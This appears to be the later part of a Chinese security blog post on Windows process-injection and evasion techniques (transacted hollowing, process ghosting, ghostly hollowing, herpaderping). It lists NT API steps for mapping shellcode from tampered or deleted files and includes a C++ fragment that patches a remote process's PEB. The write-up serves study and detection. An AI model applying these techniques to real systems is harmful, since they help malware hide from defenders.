+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.打开一个正常文件，创建一个transaction(NtCreateTransaction)</span><br><span class="line">2.打开源程序句柄（CreateFileTransacted）</span><br><span class="line">3.向源程序句柄写入shellcode(CreateFile,CreateFileMapping,MapViewOfFile,VirtualAlloc,memcpy,WriteFile)</span><br><span class="line">4.根据此时的文件内容，创建一个section(NtCreateSection)</span><br><span class="line">5.回滚到修改事务之前的状态，抹去一系列更改操作(RollbackTransaction)</span><br><span class="line">6.通过刚刚创建的section，创建挂起进程(CreateProcessInternalW)</span><br><span class="line">7.映射section到目标进程内存(NtMapViewOfSection) 返回shellcode在目标进程内存中的初始地址(sectionBaseAddress)</span><br><span class="line">8.设置进程参数并修补远程进程的peb(NtQueryInformationProcess)</span><br></pre></td></tr></table></figure>
+
+<p>该方法结合了doppel的事物特性和 process hollowing，且通过api的替换修复了doppel中的权限不足的问题。</p>
+<p><img src="https://www.malwarebytes.com/blog/images/uploads/2018/08/osildr1-2_.png" alt="img"></p>
+<p>效果演示</p>
+<p>创建的挂起进程为notepad.exe，指定payload为计算器，transaction file为 1.txt</p>
+<p><img src="/2022/11/12/inject/image-20221026104451112.png" alt="image-20221026104451112"></p>
+<h2 id="Process-Ghosting"><a href="#Process-Ghosting" class="headerlink" title="Process Ghosting"></a>Process Ghosting</h2><p><a target="_blank" rel="noopener" href="https://www.elastic.co/cn/blog/process-ghosting-a-new-executable-image-tampering-attack">https://www.elastic.co/cn/blog/process-ghosting-a-new-executable-image-tampering-attack</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hasherezade/process_ghosting">https://github.com/hasherezade/process_ghosting</a></p>
+<p>在Windows中，如果映射可执行程序到内存中，那么可执行程序就不应该被修改，如果尝试修改返回错误。</p>
+<p>这个限制针对已经映射到内存中的程序。 process ghosting利用了其中的设计缺陷，以<code>Generic_read</code>和<code>Generic_write</code>权限打开文件，对其设置删除标志，将shellcode写入到文件中，然后映射文件到内存中，最后删除这个文件。</p>
+<p><img src="/2022/11/12/inject/image-20221025142025472.png" alt="image-20221025142025472"></p>
+<p>实现步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.打开文件 (NtOpenFile)</span><br><span class="line">2.设置删除标志 (NtSetInformationFile  FILE_DISPOSITION_INFORMATION.DeleteFile = true)</span><br><span class="line">3.修改文件写入shellcode(NtWriteFile)</span><br><span class="line">4.创建section(NtCreateSection)</span><br><span class="line">5.关闭删除挂起句柄，删除文件(NtClose)</span><br><span class="line">6.使用section创建一个进程(NtCreateProcess)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在Windows上删除文件有多种方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.在旧文件上创建一个新文件，并设置 FILE_SUPERSEDE 或 CREATE_ALWAYS flag</span><br><span class="line">2.在创建文件时设置 FILE_DELETE_ON_CLOSE 或 FILE_FLAG_DELETE_ON_CLOSE flag</span><br><span class="line">3.通过 NtSetInformationFile 调用FileDispositionInformation文件信息类时，将FILE_DISPOSITION_INFORMATION结构中的Deletefile设置为true</span><br></pre></td></tr></table></figure>
+
+<p>这里采用了第三种方法</p>
+<p>这里会创建一个tmp文件，是一个检测点</p>
+<p><img src="/2022/11/12/inject/image-20221024162837016.png" alt="image-20221024162837016"></p>
+<p>修改进程参数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">RtlCreateProcessParametersEx</span>(&amp;processParameters, &amp;uTargetFile, &amp;uDllPath, <span class="literal">NULL</span>,</span><br><span class="line">		&amp;uTargetFile, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, RTL_USER_PROC_PARAMS_NORMALIZED);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在目标进程为参数分配内存</span></span><br><span class="line">	PVOID paramBuffer = processParameters;</span><br><span class="line">	SIZE_T paramSize = processParameters-&gt;EnvironmentSize + processParameters-&gt;MaximumLength;</span><br><span class="line">	<span class="comment">//为paramBuffer分配内存</span></span><br><span class="line">	status = <span class="built_in">NtAllocateVirtualMemory</span>(hProcess, &amp;paramBuffer, <span class="number">0</span>, &amp;paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">		<span class="built_in">perror</span>(<span class="string">&quot;[-] Unable To Allocate Memory For Process Parameters...\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Allocated Memory For Parameters %p\n&quot;</span>, paramBuffer);</span><br><span class="line">	<span class="comment">// 将进程参数写入目标进程</span></span><br><span class="line">	status = <span class="built_in">NtWriteVirtualMemory</span>(hProcess, processParameters, processParameters,</span><br><span class="line">	processParameters-&gt;EnvironmentSize + processParameters-&gt;MaximumLength, <span class="literal">NULL</span>);</span><br><span class="line">	PEB* remotePEB;</span><br><span class="line">	remotePEB = (PEB*)pbi.PebBaseAddress;</span><br><span class="line">	<span class="comment">// 修改目标进程peb的进程参数</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, &amp;remotePEB-&gt;ProcessParameters, &amp;processParameters, <span class="built_in"><span class="keyword">sizeof</span></span>(PVOID), <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		<span class="built_in">perror</span>(<span class="string">&quot;[-] Error Updating Process Parameters!!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="Ghostly-Hollowing"><a href="#Ghostly-Hollowing" class="headerlink" title="Ghostly Hollowing"></a>Ghostly Hollowing</h2><p>和transacted hollowing类似，将创建进程那一部分</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hasherezade/transacted_hollowing">https://github.com/hasherezade/transacted_hollowing</a></p>
+<p><img src="/2022/11/12/inject/image-20221024230139418.png" alt="image-20221024230139418"></p>
+<p>大致步骤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.打开文件 (NtOpenFile)</span><br><span class="line">2.设置删除标志 (NtSetInformationFile  FILE_DISPOSITION_INFORMATION.DeleteFile = true)</span><br><span class="line">3.修改文件写入shellcode(NtWriteFile)</span><br><span class="line">4.创建section(NtCreateSection)</span><br><span class="line">5.关闭删除挂起句柄，删除文件(NtClose)</span><br><span class="line">6.使用section创建一个进程(NtCreateProcess)</span><br><span class="line">7.分配进程参数和环境变量(RtlCreateProcessParametersEx、NtAllocateVirtualMemory)</span><br><span class="line">8.创建线程在进程中执行(NtCreateThread)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="process-Herpaderping"><a href="#process-Herpaderping" class="headerlink" title="process Herpaderping"></a>process Herpaderping</h2><p><a target="_blank" rel="noopener" href="https://github.com/jxy-s/herpaderping">https://github.com/jxy-s/herpaderping</a></p>
+<p><img src="/2022/11/12/inject/image-20221027234502944.png" alt="image-20221027234502944"></p>
+<p>根据上图，可以看到该方法的大致流程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.打开文件 (CreateFile)</span><br><span class="line">2.向文件写入payload(WriteFile)</span><br><span class="line">3.创建section映射到内存(NtCreateSection，SEC_IMAGE)</span><br><span class="line">4.创建进程A(NtCreateProcessEx)</span><br><span class="line">5.向第二步中的同一个文件写入任意内容比如字符串</span><br><span class="line">6.关闭并保存文件为xx.tmp ，文件保存到磁盘，磁盘的内容是上一步写的字符串()</span><br><span class="line">7.准备进程参数并创建线程()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>该方法通过在映射到内存后修改磁盘上的内容来掩盖进程的目的，关键步骤是 向文件写入shellcode映射到内存后再修改磁盘上的文件。</p>
+<p><img src="/2022/11/12/inject/image-20221028004227315.png" alt="image-20221028004227315"></p>
+<p><img src="/2022/11/12/inject/image-20221028004250790.png" alt="image-20221028004250790"></p>
+<p><img src="/2022/11/12/inject/image-20221028093107278.png" alt="image-20221028093107278"></p>
+<p>计算器被写入目标文件</p>
+<p><img src="/2022/11/12/inject/image-20221028093423776.png" alt="image-20221028093423776"></p>
+<p>目标文件被映射到内存中，实际上映射的是上一步中的计算器</p>
+<p><img src="/2022/11/12/inject/image-20221028093454512.png" alt="image-20221028093454512"></p>
+<p>计算器通过tmp文件执行</p>
+<p><img src="/2022/11/12/inject/image-20221028093840014.png" alt="image-20221028093840014"></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hasherezade/process_doppelganging">https://github.com/hasherezade/process_doppelganging</a></p>
+<p><a target="_blank" rel="noopener" href="https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/">https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations">https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations</a></p>
+
+  </div>
+</article>
+
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="vcomments" class="blog-post-comments"></div>
+    <script>
+        new Valine({
+            el: '#vcomments',
+            visitor: true,
+            appId: '7u7uebjtVAc7zqC8W6KLczVp-gzGzoHsz',
+            appKey: 'MWpJPixdx6qnP8OBPnTR7Yd9',
+            placeholder: '',
+            avatar: 'mp'
+        })
+    </script>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links">Links</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CreateRemoteThread"><span class="toc-number">1.</span> <span class="toc-text">CreateRemoteThread</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apc%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">apc注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reflective-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">Reflective 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#API-Hook"><span class="toc-number">4.</span> <span class="toc-text">API Hook</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Inline-Hook%E8%A6%86%E7%9B%96%E4%BB%A3%E7%A0%81-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E4%BB%A3%E7%A0%81"><span class="toc-number">4.0.1.</span> <span class="toc-text">Inline Hook覆盖代码 -修改函数代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IAT-hook-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">4.0.2.</span> <span class="toc-text">IAT hook -修改函数地址</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hollowing"><span class="toc-number">5.</span> <span class="toc-text">hollowing</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#process-hollowing"><span class="toc-number">5.0.1.</span> <span class="toc-text">process hollowing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dll-hollowing%EF%BC%88Module-Stomping%EF%BC%89"><span class="toc-number">5.0.2.</span> <span class="toc-text">dll hollowing（Module Stomping）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Process-Doppelganging"><span class="toc-number">6.</span> <span class="toc-text">Process Doppelganging</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Transacted-Hollowing"><span class="toc-number">7.</span> <span class="toc-text">Transacted Hollowing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Process-Ghosting"><span class="toc-number">8.</span> <span class="toc-text">Process Ghosting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ghostly-Hollowing"><span class="toc-number">9.</span> <span class="toc-text">Ghostly Hollowing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#process-Herpaderping"><span class="toc-number">10.</span> <span class="toc-text">process Herpaderping</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0range-x.github.io/2022/11/12/inject/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2022/11/12/inject/&text=process-injection"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2022/11/12/inject/&title=process-injection"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2022/11/12/inject/&is_video=false&description=process-injection"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=process-injection&body=Check out this article: https://0range-x.github.io/2022/11/12/inject/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2022/11/12/inject/&title=process-injection"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2022/11/12/inject/&title=process-injection"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2022/11/12/inject/&title=process-injection"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2022/11/12/inject/&title=process-injection"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2022/11/12/inject/&name=process-injection&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2022/11/12/inject/&t=process-injection"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    0r@nge
+  </div>
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</footer>
+
+    </div>
+
+    
+
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-86660611-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
